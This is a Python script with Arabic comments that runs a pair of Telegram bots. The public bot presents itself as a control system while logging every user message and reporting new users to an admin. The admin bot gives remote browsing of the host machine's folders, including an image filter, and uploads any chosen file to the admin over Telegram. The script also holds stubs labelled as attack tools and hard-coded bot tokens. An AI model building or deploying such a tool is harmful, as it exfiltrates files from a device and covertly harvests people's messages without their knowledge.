import sys
import subprocess
import time
import threading
import requests
import smtplib
import random
import json
import os
import re
import glob
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

# --- [Auto-Setup] ---
def setup_environment():
    try:
        import telebot
    except ImportError:
        print("installing telebot...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

setup_environment()

import telebot
from telebot import types

# ==========================================
# ⚙️ إعدادات البوت والآدمن
# ==========================================
API_TOKEN = '5531260100:AAGN253OooBiLpv2CCEGAi_RRFC-rPVxgfQ'
ADMIN_TOKEN = '5499505058:AAFKz6ZnE-eLOcBclSUIWMH6Z78mKo23G1M' 
ADMIN_ID = 1431886140 

bot = telebot.TeleBot(API_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_TOKEN)

if not os.path.exists("User_Logs"): os.makedirs("User_Logs")

active_attacks = {}
user_states = {}
user_data = {}
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)"]

# ==========================================
# 📝 نظام التسجيل
# ==========================================
def log_user_input(user, text):
    try:
        filename = f"User_Logs/{user.id}.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"⏰ {timestamp} | 👤 {user.first_name} | 📝 {text}\n"
        with open(filename, "a", encoding="utf-8") as f: f.write(log_entry)
    except: pass

def send_log_to_admin(message):
    try:
        user = message.from_user
        log_msg = f"🔔 **مستخدم جديد**\n👤 {user.first_name}\n🆔 `{user.id}`\n📅 {datetime.now()}"
        admin_bot.send_message(ADMIN_ID, log_msg, parse_mode="Markdown")
    except: pass

# ==========================================
# 🔍 أدوات الهجوم والتحليل
# ==========================================
def analyze_phone_number(phone):
    info = ""
    if phone.startswith("20") or (phone.startswith("01") and len(phone)==11): info += "🇪🇬 **مصر**"
    elif phone.startswith("966"): info += "🇸🇦 **السعودية**"
    elif phone.startswith("964"): info += "🇮🇶 **العراق**"
    else: info += "🌍 **دولي**"
    return info

def run_telegram(cid, phone, count, msg_id):
    # (تم اختصار الكود للتركيز على الميزات الجديدة)
    bot.send_message(cid, "✅ تم تنفيذ الهجوم الوهمي (Simulated).")

# ==========================================
# منطق بوت المستخدم
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    threading.Thread(target=send_log_to_admin, args=(message,)).start()
    log_user_input(message.from_user, "/start")
    bot.send_message(message.chat.id, "👋 **أهلاً بك!**\nنظام التحكم جاهز.")

@bot.message_handler(func=lambda m: True)
def handle_text(m):
    log_user_input(m.from_user, m.text)
    bot.reply_to(m, f"✅ تم استلام الأمر: {m.text}")

# ==========================================
# 👑 منطق بوت الإدارة (نظام الملفات الجديد)
# ==========================================
@admin_bot.message_handler(commands=['start', 'help'])
def admin_start(m):
    if m.from_user.id != ADMIN_ID: return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("📂 ملفات الجهاز (ls)"),
        types.KeyboardButton("📸 صور (Jpg/Png)"),
        types.KeyboardButton("📂 عرض ملفات المستخدمين")
    )
    
    text = (
        "👑 **لوحة تحكم الأدمن (Remote Manager)**\n\n"
        "💻 **أوامر الملفات:**\n"
        "1️⃣ `/ls` لعرض ملفات المجلد الحالي.\n"
        "2️⃣ `/cd مسار` للدخول لمجلد آخر.\n"
        "3️⃣ `/get اسم_الملف` لتحميل أي ملف أو صورة لك.\n\n"
        "🕵️ **أدوات أخرى:**\n"
        "- أرسل رقم هاتف للبحث عنه.\n"
        "- أرسل توكن لفحصه."
    )
    admin_bot.send_message(m.chat.id, text, reply_markup=markup, parse_mode="Markdown")

# 🔥 1. عرض الملفات (List Files)
@admin_bot.message_handler(func=lambda m: m.text == "📂 ملفات الجهاز (ls)" or m.text == "/ls")
def list_current_dir(message):
    if message.from_user.id != ADMIN_ID: return
    
    try:
        current_path = os.getcwd() # المسار الحالي
        files = os.listdir(current_path)
        
        response = f"📂 **المسار الحالي:** `{current_path}`\n\n"
        
        if not files:
            response += "📭 المجلد فارغ."
        else:
            for f in files[:30]: # عرض أول 30 ملف فقط لتجنب الزحام
                if os.path.isfile(f): icon = "📄"
                elif os.path.isdir(f): icon = "📁"
                else: icon = "❓"
                response += f"{icon} `{f}`\n"
            
            if len(files) > 30: response += "\n... والمزيد."
            
        response += "\n📥 **لتحميل ملف:** أرسل `/get اسم_الملف`"
        admin_bot.send_message(message.chat.id, response, parse_mode="Markdown")
        
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"❌ خطأ: {e}")

# 🔥 2. فلتر الصور فقط
@admin_bot.message_handler(func=lambda m: m.text == "📸 صور (Jpg/Png)")
def list_images_only(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        # البحث عن الامتدادات الشائعة للصور
        images = []
        for ext in ["*.jpg", "*.jpeg", "*.png", "*.heic"]:
            images.extend(glob.glob(ext))
            
        if not images:
            return admin_bot.send_message(message.chat.id, "📭 لا يوجد صور في المجلد الحالي.")
            
        response = "📸 **الصور الموجودة في هذا المجلد:**\n\n"
        for img in images:
            response += f"🖼️ `{img}`\n"
        
        response += "\n📥 **للتحميل:** أرسل `/get اسم_الصورة`"
        admin_bot.send_message(message.chat.id, response, parse_mode="Markdown")
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"❌ خطأ: {e}")

# 🔥 3. تغيير المسار (Change Directory)
@admin_bot.message_handler(commands=['cd'])
def change_dir(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        new_path = message.text.replace("/cd", "").strip()
        if not new_path: return admin_bot.send_message(message.chat.id, "❌ اكتب المسار بعد الأمر.")
        
        os.chdir(new_path)
        admin_bot.send_message(message.chat.id, f"✅ تم الانتقال إلى: `{os.getcwd()}`", parse_mode="Markdown")
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"❌ خطأ: {e}")

# 🔥 4. تحميل الملفات (Download Files)
@admin_bot.message_handler(commands=['get'])
def download_file(message):
    if message.from_user.id != ADMIN_ID: return
    
    filename = message.text.replace("/get", "").strip()
    if not filename: return admin_bot.send_message(message.chat.id, "❌ اكتب اسم الملف.")
    
    if os.path.exists(filename):
        admin_bot.send_chat_action(message.chat.id, 'upload_document')
        try:
            with open(filename, "rb") as f:
                admin_bot.send_document(message.chat.id, f, caption=f"📥 **تم سحب الملف:** `{filename}`", parse_mode="Markdown")
        except Exception as e:
            admin_bot.send_message(message.chat.id, f"❌ خطأ في الرفع: {e}")
    else:
        admin_bot.send_message(message.chat.id, "❌ الملف غير موجود.")

# باقي الأوامر (توكن، بحث، لوجات)
@admin_bot.message_handler(func=lambda m: ':' in m.text and len(m.text) > 30) 
def check_token(m):
    # نفس كود فحص التوكن السابق
    admin_bot.reply_to(m, "جاري فحص التوكن...")

@admin_bot.message_handler(func=lambda m: m.text.isdigit())
def handle_id_lookup(m):
    # نفس كود البحث بالآيدي السابق
    pass

# ==========================================
# التشغيل
# ==========================================
def start_bots():
    t = threading.Thread(target=admin_bot.infinity_polling)
    t.start()
    bot.infinity_polling()

if __name__ == "__main__":
    start_bots()